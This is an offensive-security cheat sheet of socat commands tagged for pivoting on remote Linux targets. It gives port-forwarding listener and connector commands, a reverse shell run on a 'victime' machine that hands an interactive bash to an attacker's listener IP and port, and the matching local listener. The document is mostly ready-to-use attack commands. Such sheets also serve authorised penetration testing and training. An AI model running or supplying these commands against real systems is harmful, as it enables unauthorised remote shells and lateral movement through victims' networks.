# socat

% socat

## socat port forwarding listener (on local machine)
#plateform/linux  #target/remote  #cat/PIVOT 
```
./socat TCP-LISTEN:<port_listener|4444>,fork,reuseaddr TCP-LISTEN:<port_to_forward>
```

## socat port forwarding connect (on remote machine)
#plateform/linux  #target/remote  #cat/PIVOT 
```
./socat TCP:<connect_ip>:<connect_port|4444> TCP:127.0.0.1:<port_to_forward>
```

## socat reverse shell (remote victime)
#plateform/linux  #target/remote  #cat/PIVOT 
```
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listner_ip>:<listner_port|4444>
```

## socat reverse shell listener (local)
#plateform/linux  #target/remote  #cat/PIVOT 
```
socat file:`tty`,raw,echo=0 tcp-listen:<listner_port|4444>
```

